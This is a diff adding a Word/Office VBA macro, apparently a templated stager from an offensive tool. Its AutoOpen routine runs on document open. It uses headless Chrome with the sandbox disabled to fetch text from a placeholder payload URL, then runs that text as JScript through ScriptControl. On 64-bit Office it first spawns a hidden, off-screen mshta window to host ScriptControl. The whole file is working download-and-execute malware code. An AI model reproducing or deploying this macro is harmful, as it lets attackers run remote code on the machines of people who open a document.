@@ -1,0 +1,71 @@
+Sub AutoOpen()
+
+    Dim aVAR1a As Object
+    Dim aVAR2a As Object
+    Dim aVAR3a As String
+    
+    aVAR3a = "aPAYLOADa"
+
+    aVAR4a = "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe --headless --no-sandbox --enable-logging --disable-gpu "
+    aVAR4a = aVAR4a & "--dump-dom " & aVAR3a
+    
+    Set aVAR1a = CreateObject("WScript.Shell")
+    Set aVAR2a = aVAR1a.exec(aVAR4a)
+    aVAR5a = aVAR2a.StdOut.ReadAll
+    aVAR2a.Terminate
+    
+    aVAR6a = "<html><head></head><body>"
+    aVAR7a = "<pre style=""word-wrap: break-word; white-space: pre-wrap;"">"
+    aVAR8a = "</pre>"
+    aVAR9a = "</body></html>"
+    aVAR10a = Replace(aVAR5a, aVAR6a, "")
+    aVAR10a = Replace(aVAR10a, aVAR7a, "")
+    aVAR10a = Replace(aVAR10a, aVAR8a, "")
+    aVAR10a = Replace(aVAR10a, aVAR9a, "")
+
+    Set aVAR11a = aFUNC1a("ScriptControl")
+    aVAR11a.Language = "JScript"
+    aVAR12a = aVAR11a.Eval("(" + aVAR10a + ")")
+
+    aFUNC1a Empty
+    
+End Sub
+
+Function aFUNC1a(sProgID)
+
+    Static aVAR13a As Object
+    Dim aVAR14a As Boolean
+
+    #If Win64 Then
+        aVAR14a = InStr(TypeName(aVAR13a), "HTMLWindow") > 0
+        If IsEmpty(sProgID) Then
+            If aVAR14a Then aVAR13a.Close
+            Exit Function
+        End If
+        If Not aVAR14a Then
+            Set aVAR13a = aFUNC2a()
+            aVAR13a.execScript "Function aFUNC1a(sProgID): Set aFUNC1a = CreateObject(sProgID): End Function", "VBScript"
+        End If
+        Set aFUNC1a = aVAR13a.aFUNC1a(sProgID)
+    #Else
+        If Not IsEmpty(sProgID) Then Set aFUNC1a = CreateObject(sProgID)
+    #End If
+
+End Function
+
+Function aFUNC2a()
+
+    Dim aVAR15a, aVAR16a
+
+    On Error Resume Next
+    aVAR15a = Left(CreateObject("Scriptlet.TypeLib").GUID, 38)
+    CreateObject("WScript.Shell").Run "%systemroot%\syswow64\mshta.exe about:""<head><script>moveTo(-32000,-32000);document.title='x86Host'</script><hta:application showintaskbar=no /><object id='shell' classid='clsid:8856F961-340A-11D0-A96B-00C04FD705A2'><param name=RegisterAsBrowser value=1></object><script>shell.putproperty('" & aVAR15a & "',document.parentWindow);</script></head>""", 0, False
+    Do
+        For Each aVAR16a In CreateObject("Shell.Application").Windows
+            Set aFUNC2a = aVAR16a.GetProperty(aVAR15a)
+            If Err.Number = 0 Then Exit Function
+            Err.Clear
+        Next
+    Loop
+
+End Function
